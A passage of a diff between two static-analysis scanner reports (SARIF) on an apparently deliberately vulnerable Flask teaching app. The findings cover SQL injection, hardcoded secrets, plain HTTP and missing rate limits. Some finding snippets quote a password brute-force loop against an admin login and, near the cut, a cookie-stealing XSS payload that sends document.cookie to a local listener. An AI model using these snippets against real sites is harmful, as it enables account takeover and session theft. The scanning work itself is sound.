           "message": {
-            "text": "Detected a request using 'http://'. This request will be unencrypted. Use 'https://' instead.\n"
+            "text": "There's an HTTP request made with requests,\nbut the raise_for_status() utility method isn't used.\nThis can result in request errors going unnoticed\nand your code behaving in unexpected ways,\nsuch as if your authorization API returns a 500 error\nwhile you're only checking for a 401."
           },
           "locations": [
             {
@@ -1454,7 +1477,38 @@
             }
           ],
           "fingerprints": {
-            "matchBasedId/v1": "59afbc72846ff3c3f2544da7e53d4867326c9ebce844449de57cf0b78575a673c6cf4c4534875efb1fc5fe1cda77341c91b6f47537a83aeb335977a778237d4b_1"
+            "matchBasedId/v1": "bb89b20dcffb820b413d2d75fd789d89afdad1265b73b294290fa221d6521280207f1ab2edc3bf73d30515ba4bc273f3f355e4911a2b19850040e491719c9701_0"
+          },
+          "properties": {}
+        },
+        {
+          "ruleId": "8e4d21d7-f881-305d-b031-ef5f82af0dca",
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "Detected a request using 'http://'. This request will be unencrypted, and attackers could listen into traffic on the network and be able to obtain sensitive information. Use 'https://' instead."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "bad/api_post.py",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 30,
+                  "startColumn": 23,
+                  "endLine": 30,
+                  "endColumn": 55,
+                  "snippet": {
+                    "text": "    r = requests.post('http://127.0.1.1:5000/api/post', json={'text':message}, headers={'X-APIKEY': api_key})"
+                  }
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "matchBasedId/v1": "36396a777056e08c5903389cefdb99150b59a22d56aa41f7ad93cd186fe37c26ea1b846923a8c84d5b75220aa5efb644719dc32abbc2430c6d59fa4bf1051952_0"
           },
           "properties": {}
         },
@@ -1680,7 +1734,7 @@
           "kind": "fail",
           "level": "warning",
           "message": {
-            "text": "Detected possible formatted SQL query. Use parameterized queries instead."
+            "text": "Avoiding SQL string concatenation: untrusted input concatenated with raw SQL query can result in SQL Injection. In order to execute raw query safely, prepared statement should be used. SQLAlchemy provides TextualSQL to easily used prepared statement with named parameters. For complex SQL composition, use SQL Expression Language or Schema Definition Language. In most cases, SQLAlchemy ORM will be a better option."
           },
           "locations": [
             {
@@ -1702,38 +1756,7 @@
             }
           ],
           "fingerprints": {
-            "matchBasedId/v1": "7646e8545783ec96d18b65d01db0436e32bc239bef720fc4b7a55a8332edbd29c038e1221d0d218cbf2201b5725ee2b6ded089698dd6792e484ac714d77d485b_2"
-          },
-          "properties": {}
-        },
-        {
-          "ruleId": "28a8f063-18ec-3055-a65f-490ad91616c6",
-          "kind": "fail",
-          "level": "warning",
-          "message": {
-            "text": "Hardcoded variable `SECRET_KEY` detected. Use environment variables or config files instead"
-          },
-          "locations": [
-            {
-              "physicalLocation": {
-                "artifactLocation": {
-                  "uri": "bad/vulpy-ssl.py",
-                  "uriBaseId": "%SRCROOT%"
-                },
-                "region": {
-                  "startLine": 13,
-                  "startColumn": 1,
-                  "endLine": 13,
-                  "endColumn": 37,
-                  "snippet": {
-                    "text": "app.config['SECRET_KEY'] = 'aaaaaaa'"
-                  }
-                }
-              }
-            }
-          ],
-          "fingerprints": {
-            "matchBasedId/v1": "ac0a4e2f283639c10fb14cfd24bba7550fd49f207a54dd181fa255f659aeaebfec289fa3b2addf6b7344087c504b90306454a07d36408d42d2ad2af393641eb8_0"
+            "matchBasedId/v1": "e379572c0e7f3c5b2459a49933881d57772d9f54f03f1a88ded53beb038c0c1b53f65f3aed0cd016bd5636e2996ecc8da24e94f17bf4b1c87e6d3667b477d3ab_0"
           },
           "properties": {}
         },
@@ -1765,6 +1788,37 @@
           ],
           "fingerprints": {
             "matchBasedId/v1": "0a53c2b63229ce44826eca9da4e0e8edf0e2093bf99d9b39f129a15db7e4dd8947ec00770ab1abe02a88111377108647ecfcd13ccc5bdef79e6016293d86b491_0"
+          },
+          "properties": {}
+        },
+        {
+          "ruleId": "28a8f063-18ec-3055-a65f-490ad91616c6",
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "Hardcoded variable `SECRET_KEY` detected. Use environment variables or config files instead"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "bad/vulpy-ssl.py",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 13,
+                  "startColumn": 1,
+                  "endLine": 13,
+                  "endColumn": 37,
+                  "snippet": {
+                    "text": "app.config['SECRET_KEY'] = 'aaaaaaa'"
+                  }
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "matchBasedId/v1": "e39faae361f4a0c2edb416c2d6547f9c4a192c91f08adc6f0fcdd12f7a6012a11d90658d3e2ce169a492bf4a6a0bad443bed395bd18a514358ec043ce78a500a_0"
           },
           "properties": {}
         },
@@ -1986,37 +2040,6 @@
           "properties": {}
         },
         {
-          "ruleId": "fcea9357-e3af-3bcc-b917-b935597c5f92",
-          "kind": "fail",
-          "level": "warning",
-          "message": {
-            "text": "Regex `r'[0-9]'` may be vulnerable to catastrophic backtracking, which may lead to denial of service attacks. (This rule only matches regex usage, not actual REDoS patterns. For full detection, use Semgrep Pro Engine.)"
-          },
-          "locations": [
-            {
-              "physicalLocation": {
-                "artifactLocation": {
-                  "uri": "good/cutpasswd.py",
-                  "uriBaseId": "%SRCROOT%"
-                },
-                "region": {
-                  "startLine": 17,
-                  "startColumn": 16,
-                  "endLine": 17,
-                  "endColumn": 46,
-                  "snippet": {
-                    "text": "        if len(re.findall(r'[0-9]', password)) < 1:"
-                  }
-                }
-              }
-            }
-          ],
-          "fingerprints": {
-            "matchBasedId/v1": "f21db550fbe9c6f6ea42db03e1d5aa1678c6ddc2758a61b0b1e4aac0b6797fdb154d4011860d7aea7c851ddf335c89ced1ab41bf7b9e9edf7a34973db985dca9_0"
-          },
-          "properties": {}
-        },
-        {
           "ruleId": "6c0cd598-8cc9-34e6-918a-dd097c577ae2",
           "kind": "fail",
           "level": "warning",
@@ -2048,7 +2071,7 @@
           "properties": {}
         },
         {
-          "ruleId": "028e7d1e-0a81-3522-9d28-210152e6f2b1",
+          "ruleId": "e76e6ef2-7d3a-3558-97ee-9b43b4603980",
           "kind": "fail",
           "level": "warning",
           "message": {
@@ -2062,19 +2085,50 @@
                   "uriBaseId": "%SRCROOT%"
                 },
                 "region": {
-                  "startLine": 22,
-                  "startColumn": 16,
-                  "endLine": 22,
-                  "endColumn": 87,
+                  "startLine": 5,
+                  "startColumn": 1,
+                  "endLine": 25,
+                  "endColumn": 14,
                   "snippet": {
-                    "text": "    response = requests.post(URL, data = {'username': username, 'password': password})"
+                    "text": "URL = 'http://127.0.1.1:5000/user/login'\n\nusername = 'admin'\n\npasswords = [\n    '1',\n    '12',\n    '123',\n    '1234',\n    '12345',\n    '123456',\n    '1234567',\n    '12345678',\n    'SuperSecret',\n]\n\nfor password in passwords:\n    response = requests.post(URL, data = {'username': username, 'password': password})\n    if 'HOME' in response.text:\n        print('cracked!', username, password)\n        break"
                   }
                 }
               }
             }
           ],
           "fingerprints": {
-            "matchBasedId/v1": "ee23f7dd64c024bfefd3ba469b4d49007716e0be2f514e1f5ad2e891cb7cf085f8f7b12c34d22f62917f270bc031e1e77b118cbdf81368d4376e982a28495a26_0"
+            "matchBasedId/v1": "425d33482ee8e48cc105af726da87c16bb78b7c994ac170b0078c2fdfaa6cb9dfcdb8caf2a46cb44d217e71c13b79c152da079d9129d96d03666a4df94e2d1f5_0"
+          },
+          "properties": {}
+        },
+        {
+          "ruleId": "fcea9357-e3af-3bcc-b917-b935597c5f92",
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "Regex `r'[0-9]'` may be vulnerable to catastrophic backtracking, which may lead to denial of service attacks. (This rule only matches regex usage, not actual REDoS patterns. For full detection, use Semgrep Pro Engine.)"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "good/cutpasswd.py",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 17,
+                  "startColumn": 16,
+                  "endLine": 17,
+                  "endColumn": 46,
+                  "snippet": {
+                    "text": "        if len(re.findall(r'[0-9]', password)) < 1:"
+                  }
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "matchBasedId/v1": "f21db550fbe9c6f6ea42db03e1d5aa1678c6ddc2758a61b0b1e4aac0b6797fdb154d4011860d7aea7c851ddf335c89ced1ab41bf7b9e9edf7a34973db985dca9_0"
           },
           "properties": {}
         },
@@ -2110,37 +2164,6 @@
           "properties": {}
         },
         {
-          "ruleId": "40ea9e2b-fabe-3b6f-968b-c2c1622d157c",
-          "kind": "fail",
-          "level": "warning",
-          "message": {
-            "text": "Function 'getcountry' is missing a rate-limiting decorator.\nHigh volume traffic to this function could starve application\nresources. Consider adding rate limiting from a library such\nas 'django-ratelimit'.\n"
-          },
-          "locations": [
-            {
-              "physicalLocation": {
-                "artifactLocation": {
-                  "uri": "good/libsession.py",
-                  "uriBaseId": "%SRCROOT%"
-                },
-                "region": {
-                  "startLine": 15,
-                  "startColumn": 1,
-                  "endLine": 25,
-                  "endColumn": 19,
-                  "snippet": {
-                    "text": "def getcountry(request):\n\n    country = 'XX' # For local connections\n\n    try:\n        geo = reader.country(request.remote_addr)\n        country = geo.country.iso_code\n    except Exception:\n        pass\n\n    return country"
-                  }
-                }
-              }
-            }
-          ],
-          "fingerprints": {
-            "matchBasedId/v1": "e5481a939b070eefccc7a42e0cc35615f1c47813232012aab2022513ddc770e80f1704302e3771d30c10cfd35f304d13d368fc49f9229cfc982eeb8342b9dd00_0"
-          },
-          "properties": {}
-        },
-        {
           "ruleId": "3cddfbe8-b0d1-333c-a688-50e808bde6e4",
           "kind": "fail",
           "level": "warning",
@@ -2172,11 +2195,11 @@
           "properties": {}
         },
         {
-          "ruleId": "cc1fe853-4ac8-32a3-963b-6c094dbea976",
+          "ruleId": "40ea9e2b-fabe-3b6f-968b-c2c1622d157c",
           "kind": "fail",
           "level": "warning",
           "message": {
-            "text": "Function 'create' is missing a rate-limiting decorator.\nHigh volume traffic to this function could starve application\nresources. Consider adding rate limiting from a library such\nas 'django-ratelimit'.\n"
+            "text": "Function 'getcountry' is missing a rate-limiting decorator.\nHigh volume traffic to this function could starve application\nresources. Consider adding rate limiting from a library such\nas 'django-ratelimit'.\n"
           },
           "locations": [
             {
@@ -2186,81 +2209,19 @@
                   "uriBaseId": "%SRCROOT%"
                 },
                 "region": {
-                  "startLine": 28,
+                  "startLine": 15,
                   "startColumn": 1,
-                  "endLine": 36,
-                  "endColumn": 20,
+                  "endLine": 25,
+                  "endColumn": 19,
                   "snippet": {
-                    "text": "def create(request, response, username):\n\n    country = getcountry(request)\n\n    response.set_cookie('vulpy_session', fernet.encrypt(\n        (username + '|' + country).encode()\n    ))\n\n    return response"
+                    "text": "def getcountry(request):\n\n    country = 'XX' # For local connections\n\n    try:\n        geo = reader.country(request.remote_addr)\n        country = geo.country.iso_code\n    except Exception:\n        pass\n\n    return country"
                   }
                 }
               }
             }
           ],
           "fingerprints": {
-            "matchBasedId/v1": "9c9a7819b6715ebb12673caaf82e351adbc2108ae951b7855e69f0b8cb468569e356ae2e2867c3d5c02640cf4526c32d9ac7eda55ee74d4ff2c543fe98679908_0"
-          },
-          "properties": {}
-        },
-        {
-          "ruleId": "ecbd55a2-cc94-343e-aa5a-97ff01b5aa77",
-          "kind": "fail",
-          "level": "warning",
-          "message": {
-            "text": "Detected possible formatted SQL query. Use parameterized queries instead."
-          },
-          "locations": [
-            {
-              "physicalLocation": {
-                "artifactLocation": {
-                  "uri": "good/libuser.py",
-                  "uriBaseId": "%SRCROOT%"
-                },
-                "region": {
-                  "startLine": 61,
-                  "startColumn": 5,
-                  "endLine": 61,
-                  "endColumn": 171,
-                  "snippet": {
-                    "text": "    c.execute(\"INSERT INTO users (username, password, salt, failures, mfa_enabled, mfa_secret) VALUES ('%s', '%s', '%s', '%d', '%d', '%s')\" %(username, '', '', 0, 0, ''))"
-                  }
-                }
-              }
-            }
-          ],
-          "fingerprints": {
-            "matchBasedId/v1": "577acadbf9c5f99dab8b25c823c3a1d5d33ad747b692ab6546e4b2c461c1d0a49894ec686abe3f03a812ebcbd1d8668364097b85299226ad2e16bafef56b4a7c_0"
-          },
-          "properties": {}
-        },
-        {
-          "ruleId": "0f346dfa-0f58-31fe-bdc2-a8cc48f62743",
-          "kind": "fail",
-          "level": "warning",
-          "message": {
-            "text": "code after return statement will not be executed"
-          },
-          "locations": [
-            {
-              "physicalLocation": {
-                "artifactLocation": {
-                  "uri": "good/mod_user.py",
-                  "uriBaseId": "%SRCROOT%"
-                },
-                "region": {
-                  "startLine": 86,
-                  "startColumn": 5,
-                  "endLine": 87,
-                  "endColumn": 30,
-                  "snippet": {
-                    "text": "    return redirect('/')\n    flash(\"Password changed\")"
-                  }
-                }
-              }
-            }
-          ],
-          "fingerprints": {
-            "matchBasedId/v1": "a3858bd265c4aa40e3dea360b3d83d4791e5c76fade8eafeea4f9dae473e20c45fc07a9641709d6bef51cd926a196c4123fd6ac8b08b217460cc18438259ad58_0"
+            "matchBasedId/v1": "e5481a939b070eefccc7a42e0cc35615f1c47813232012aab2022513ddc770e80f1704302e3771d30c10cfd35f304d13d368fc49f9229cfc982eeb8342b9dd00_0"
           },
           "properties": {}
         },
@@ -2296,6 +2257,68 @@
           "properties": {}
         },
         {
+          "ruleId": "ecbd55a2-cc94-343e-aa5a-97ff01b5aa77",
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "Detected possible formatted SQL query. Use parameterized queries instead."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "good/libuser.py",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 61,
+                  "startColumn": 5,
+                  "endLine": 61,
+                  "endColumn": 171,
+                  "snippet": {
+                    "text": "    c.execute(\"INSERT INTO users (username, password, salt, failures, mfa_enabled, mfa_secret) VALUES ('%s', '%s', '%s', '%d', '%d', '%s')\" %(username, '', '', 0, 0, ''))"
+                  }
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "matchBasedId/v1": "577acadbf9c5f99dab8b25c823c3a1d5d33ad747b692ab6546e4b2c461c1d0a49894ec686abe3f03a812ebcbd1d8668364097b85299226ad2e16bafef56b4a7c_0"
+          },
+          "properties": {}
+        },
+        {
+          "ruleId": "cc1fe853-4ac8-32a3-963b-6c094dbea976",
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "Function 'create' is missing a rate-limiting decorator.\nHigh volume traffic to this function could starve application\nresources. Consider adding rate limiting from a library such\nas 'django-ratelimit'.\n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "good/libsession.py",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 28,
+                  "startColumn": 1,
+                  "endLine": 36,
+                  "endColumn": 20,
+                  "snippet": {
+                    "text": "def create(request, response, username):\n\n    country = getcountry(request)\n\n    response.set_cookie('vulpy_session', fernet.encrypt(\n        (username + '|' + country).encode()\n    ))\n\n    return response"
+                  }
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "matchBasedId/v1": "9c9a7819b6715ebb12673caaf82e351adbc2108ae951b7855e69f0b8cb468569e356ae2e2867c3d5c02640cf4526c32d9ac7eda55ee74d4ff2c543fe98679908_0"
+          },
+          "properties": {}
+        },
+        {
           "ruleId": "0f2fbe3b-d13d-3095-8bfd-825696364258",
           "kind": "fail",
           "level": "warning",
@@ -2323,6 +2346,37 @@
           ],
           "fingerprints": {
             "matchBasedId/v1": "e89cdaa90ee2b51485e9dd04db6c2bbea1d31c12faadbfd7a0f5ab67139a0acc009c22e53eb1296139ce01cf1d1c3f6b52231ba8d80262a83a5acc2adfdfe501_0"
+          },
+          "properties": {}
+        },
+        {
+          "ruleId": "0f346dfa-0f58-31fe-bdc2-a8cc48f62743",
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "code after return statement will not be executed"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "good/mod_user.py",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 86,
+                  "startColumn": 5,
+                  "endLine": 87,
+                  "endColumn": 30,
+                  "snippet": {
+                    "text": "    return redirect('/')\n    flash(\"Password changed\")"
+                  }
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "matchBasedId/v1": "a3858bd265c4aa40e3dea360b3d83d4791e5c76fade8eafeea4f9dae473e20c45fc07a9641709d6bef51cd926a196c4123fd6ac8b08b217460cc18438259ad58_0"
           },
           "properties": {}
         },
@@ -2455,7 +2509,7 @@
           "kind": "fail",
           "level": "warning",
           "message": {
-            "text": "Detected Flask app with debug=True. Do not deploy to production with this flag enabled as it will leak sensitive information. Instead, consider using Flask configuration variables or setting 'debug' using system environment variables."
+            "text": "top-level app.run(...) is ignored by flask. Consider putting app.run(...) behind a guard, like inside a function"
           },
           "locations": [
             {
@@ -2477,38 +2531,7 @@
             }
           ],
           "fingerprints": {
-            "matchBasedId/v1": "75fbef10674c748c80ba9bceabd5270806b660f4ae6cc92d0bc1e88db632b155268a3ac72535e33dd681a972d622a35c70132cda2df8cb9efaff7d44504026f7_0"
-          },
-          "properties": {}
-        },
-        {
-          "ruleId": "3b5975f3-e6c9-38c2-b56b-574f35d2e034",
-          "kind": "fail",
-          "level": "warning",
-          "message": {
-            "text": "Detected hardcoded temp directory. Consider using 'tempfile.TemporaryFile' instead.\n"
-          },
-          "locations": [
-            {
-              "physicalLocation": {
-                "artifactLocation": {
-                  "uri": "utils/ca-create.py",
-                  "uriBaseId": "%SRCROOT%"
-                },
-                "region": {
-                  "startLine": 31,
-                  "startColumn": 6,
-                  "endLine": 31,
-                  "endColumn": 31,
-                  "snippet": {
-                    "text": "with open('/tmp/ca.key', 'wb') as out:"
-                  }
-                }
-              }
-            }
-          ],
-          "fingerprints": {
-            "matchBasedId/v1": "0dda4d10d79f2beb0f84dbcd01e0f0a46ae037b6e7aab37ebc7f42c217631c6b72f2c04465efa4c77d64081cd7a88e8b6ca1a8196c7a1374661e6aa9b190d3aa_0"
+            "matchBasedId/v1": "f0a67255a2974e8a4a4512f25047220d0d3a59153270a82d794dccb244e33043b7469cb9bf2499bc218ab1353b9a23011ecbc9a6fb4eb772bf2abb4a44105ff0_0"
           },
           "properties": {}
         },
@@ -2540,6 +2563,37 @@
           ],
           "fingerprints": {
             "matchBasedId/v1": "0dda4d10d79f2beb0f84dbcd01e0f0a46ae037b6e7aab37ebc7f42c217631c6b72f2c04465efa4c77d64081cd7a88e8b6ca1a8196c7a1374661e6aa9b190d3aa_1"
+          },
+          "properties": {}
+        },
+        {
+          "ruleId": "3b5975f3-e6c9-38c2-b56b-574f35d2e034",
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "Detected hardcoded temp directory. Consider using 'tempfile.TemporaryFile' instead.\n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "utils/ca-create.py",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 31,
+                  "startColumn": 6,
+                  "endLine": 31,
+                  "endColumn": 31,
+                  "snippet": {
+                    "text": "with open('/tmp/ca.key', 'wb') as out:"
+                  }
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "matchBasedId/v1": "0dda4d10d79f2beb0f84dbcd01e0f0a46ae037b6e7aab37ebc7f42c217631c6b72f2c04465efa4c77d64081cd7a88e8b6ca1a8196c7a1374661e6aa9b190d3aa_0"
           },
           "properties": {}
         },
@@ -2637,6 +2691,37 @@
           "properties": {}
         },
         {
+          "ruleId": "5670c2c8-51c9-3c88-974e-11a862f02b78",
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "Detected hardcoded temp directory. Consider using 'tempfile.TemporaryFile' instead.\n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "utils/ca-csr-load.py",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 16,
+                  "startColumn": 6,
+                  "endLine": 16,
+                  "endColumn": 33,
+                  "snippet": {
+                    "text": "with open(\"/tmp/acme.csr\", \"rb\") as csr_file:"
+                  }
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "matchBasedId/v1": "b25dd6fc40a8b002edd5c6746c93f2288c104deda156d08fbf8cbde4399667c3849003d9bb837407314b0f2754a1cea9c4e74861e1032ddb35f8c41018b51f96_1"
+          },
+          "properties": {}
+        },
+        {
           "ruleId": "8b89cc8a-016b-303a-997a-89271b160e26",
           "kind": "fail",
           "level": "warning",
@@ -2664,37 +2749,6 @@
           ],
           "fingerprints": {
             "matchBasedId/v1": "b25dd6fc40a8b002edd5c6746c93f2288c104deda156d08fbf8cbde4399667c3849003d9bb837407314b0f2754a1cea9c4e74861e1032ddb35f8c41018b51f96_0"
-          },
-          "properties": {}
-        },
-        {
-          "ruleId": "0dda459c-4d45-3686-b98b-d6bb6f13f849",
-          "kind": "fail",
-          "level": "warning",
-          "message": {
-            "text": "Detected hardcoded temp directory. Consider using 'tempfile.TemporaryFile' instead.\n"
-          },
-          "locations": [
-            {
-              "physicalLocation": {
-                "artifactLocation": {
-                  "uri": "utils/ca-csr-load.py",
-                  "uriBaseId": "%SRCROOT%"
-                },
-                "region": {
-                  "startLine": 35,
-                  "startColumn": 6,
-                  "endLine": 35,
-                  "endColumn": 34,
-                  "snippet": {
-                    "text": "with open('/tmp/acme.cert', 'wb') as out:"
-                  }
-                }
-              }
-            }
-          ],
-          "fingerprints": {
-            "matchBasedId/v1": "b25dd6fc40a8b002edd5c6746c93f2288c104deda156d08fbf8cbde4399667c3849003d9bb837407314b0f2754a1cea9c4e74861e1032ddb35f8c41018b51f96_3"
           },
           "properties": {}
         },
@@ -2730,37 +2784,6 @@
           "properties": {}
         },
         {
-          "ruleId": "5670c2c8-51c9-3c88-974e-11a862f02b78",
-          "kind": "fail",
-          "level": "warning",
-          "message": {
-            "text": "Detected hardcoded temp directory. Consider using 'tempfile.TemporaryFile' instead.\n"
-          },
-          "locations": [
-            {
-              "physicalLocation": {
-                "artifactLocation": {
-                  "uri": "utils/ca-csr-load.py",
-                  "uriBaseId": "%SRCROOT%"
-                },
-                "region": {
-                  "startLine": 16,
-                  "startColumn": 6,
-                  "endLine": 16,
-                  "endColumn": 33,
-                  "snippet": {
-                    "text": "with open(\"/tmp/acme.csr\", \"rb\") as csr_file:"
-                  }
-                }
-              }
-            }
-          ],
-          "fingerprints": {
-            "matchBasedId/v1": "b25dd6fc40a8b002edd5c6746c93f2288c104deda156d08fbf8cbde4399667c3849003d9bb837407314b0f2754a1cea9c4e74861e1032ddb35f8c41018b51f96_1"
-          },
-          "properties": {}
-        },
-        {
           "ruleId": "ccb3abb9-9fdc-378b-afd9-6807b7f1aa37",
           "kind": "fail",
           "level": "warning",
@@ -2788,6 +2811,37 @@
           ],
           "fingerprints": {
             "matchBasedId/v1": "e08b9236d930f08823a3647f58eceda6dc1c26b7135329e69c542522c0718ceb638a0cc537919785450291502fa3a703fd8633826882ee75152a85c62bc07669_0"
+          },
+          "properties": {}
+        },
+        {
+          "ruleId": "0dda459c-4d45-3686-b98b-d6bb6f13f849",
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "Detected hardcoded temp directory. Consider using 'tempfile.TemporaryFile' instead.\n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "utils/ca-csr-load.py",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 35,
+                  "startColumn": 6,
+                  "endLine": 35,
+                  "endColumn": 34,
+                  "snippet": {
+                    "text": "with open('/tmp/acme.cert', 'wb') as out:"
+                  }
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "matchBasedId/v1": "b25dd6fc40a8b002edd5c6746c93f2288c104deda156d08fbf8cbde4399667c3849003d9bb837407314b0f2754a1cea9c4e74861e1032ddb35f8c41018b51f96_3"
           },
           "properties": {}
         },
@@ -2823,37 +2877,6 @@
           "properties": {}
         },
         {
-          "ruleId": "b372fb82-8b68-3a4e-8d7c-98ee30cf430c",
-          "kind": "fail",
-          "level": "warning",
-          "message": {
-            "text": "Detected hardcoded temp directory. Consider using 'tempfile.TemporaryFile' instead.\n"
-          },
-          "locations": [
-            {
-              "physicalLocation": {
-                "artifactLocation": {
-                  "uri": "utils/rsa-encrypt.py",
-                  "uriBaseId": "%SRCROOT%"
-                },
-                "region": {
-                  "startLine": 14,
-                  "startColumn": 6,
-                  "endLine": 14,
-                  "endColumn": 33,
-                  "snippet": {
-                    "text": "with open(\"/tmp/acme.pub\", \"rb\") as key_file:"
-                  }
-                }
-              }
-            }
-          ],
-          "fingerprints": {
-            "matchBasedId/v1": "75d2793ef5f11ae94914ed294c52a66762487da6198a84c36153c22fb75d0d1d0cb5549dbd2d02ca78874a6407147e656322dcee3b06accf49d13a34174a1149_0"
-          },
-          "properties": {}
-        },
-        {
           "ruleId": "802592d1-b629-355d-ae39-fd4bea678bc2",
           "kind": "fail",
           "level": "warning",
@@ -2885,7 +2908,7 @@
           "properties": {}
         },
         {
-          "ruleId": "6cb28d21-1aed-3e2b-840b-d9b7cab4cf53",
+          "ruleId": "b372fb82-8b68-3a4e-8d7c-98ee30cf430c",
           "kind": "fail",
           "level": "warning",
           "message": {
@@ -2895,23 +2918,54 @@
             {
               "physicalLocation": {
                 "artifactLocation": {
-                  "uri": "utils/rsa-keygen.py",
+                  "uri": "utils/rsa-encrypt.py",
                   "uriBaseId": "%SRCROOT%"
                 },
                 "region": {
-                  "startLine": 29,
+                  "startLine": 14,
                   "startColumn": 6,
-                  "endLine": 29,
+                  "endLine": 14,
                   "endColumn": 33,
                   "snippet": {
-                    "text": "with open('/tmp/acme.pub', 'wb') as out:"
+                    "text": "with open(\"/tmp/acme.pub\", \"rb\") as key_file:"
                   }
                 }
               }
             }
           ],
           "fingerprints": {
-            "matchBasedId/v1": "9ef4e96c1b6154e6fddd16eda82d1bfea03e9bad8af2d027faef2e14dff78f8f59c95bae155d98d587a5d022a9fdc43b3737dd0b13ab372d394a0ae91536e7d3_1"
+            "matchBasedId/v1": "75d2793ef5f11ae94914ed294c52a66762487da6198a84c36153c22fb75d0d1d0cb5549dbd2d02ca78874a6407147e656322dcee3b06accf49d13a34174a1149_0"
+          },
+          "properties": {}
+        },
+        {
+          "ruleId": "c377ef54-28cc-3b95-a01c-b699f7daab61",
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "Detected hardcoded temp directory. Consider using 'tempfile.TemporaryFile' instead.\n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "utils/rsa-verify.py",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 16,
+                  "startColumn": 6,
+                  "endLine": 16,
+                  "endColumn": 33,
+                  "snippet": {
+                    "text": "with open(\"/tmp/acme.pub\", \"rb\") as key_file:"
+                  }
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "matchBasedId/v1": "79f9f842928a5f35160b6e98c6f3c78e06c2a652e4393ed7e892d2daf899becf6c5f2e1915cf5a157e20bde39c6b1caf8176597206f3bb32a7740e8450b8a822_0"
           },
           "properties": {}
         },
@@ -2947,6 +3001,37 @@
           "properties": {}
         },
         {
+          "ruleId": "6cb28d21-1aed-3e2b-840b-d9b7cab4cf53",
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "Detected hardcoded temp directory. Consider using 'tempfile.TemporaryFile' instead.\n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "utils/rsa-keygen.py",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 29,
+                  "startColumn": 6,
+                  "endLine": 29,
+                  "endColumn": 33,
+                  "snippet": {
+                    "text": "with open('/tmp/acme.pub', 'wb') as out:"
+                  }
+                }
+              }
+            }
+          ],
+          "fingerprints": {
+            "matchBasedId/v1": "9ef4e96c1b6154e6fddd16eda82d1bfea03e9bad8af2d027faef2e14dff78f8f59c95bae155d98d587a5d022a9fdc43b3737dd0b13ab372d394a0ae91536e7d3_1"
+          },
+          "properties": {}
+        },
+        {
           "ruleId": "5ab458d0-c4bb-3392-9c00-6b2bb63732b8",
           "kind": "fail",
           "level": "warning",
@@ -2978,33 +3063,37 @@
           "properties": {}
         },
         {
-          "ruleId": "c377ef54-28cc-3b95-a01c-b699f7daab61",
+          "ruleId": "dc4a0e19-fe3b-3387-b751-5b7d7cfb0cda",
           "kind": "fail",
           "level": "warning",
           "message": {
-            "text": "Detected hardcoded temp directory. Consider using 'tempfile.TemporaryFile' instead.\n"
+            "text": "\"Potential XSS Vulnerability from User-Controlled Data in HTML String\""
           },
           "locations": [
             {
               "physicalLocation": {
                 "artifactLocation": {
-                  "uri": "utils/rsa-verify.py",
+                  "uri": "good/payloads/cookie.js",
                   "uriBaseId": "%SRCROOT%"
                 },
                 "region": {
-                  "startLine": 16,
-                  "startColumn": 6,
-                  "endLine": 16,
-                  "endColumn": 33,
+                  "startLine": 1,
+                  "startColumn": 1,
+                  "endLine": 1,
+                  "endColumn": 69,
                   "snippet": {
-                    "text": "with open(\"/tmp/acme.pub\", \"rb\") as key_file:"
+                    "text": "new Image().src = 'http://127.0.0.1:8000/cookie?c='+document.cookie;"
                   }
                 }
               }
             }
           ],
+          "partialFingerprints": {
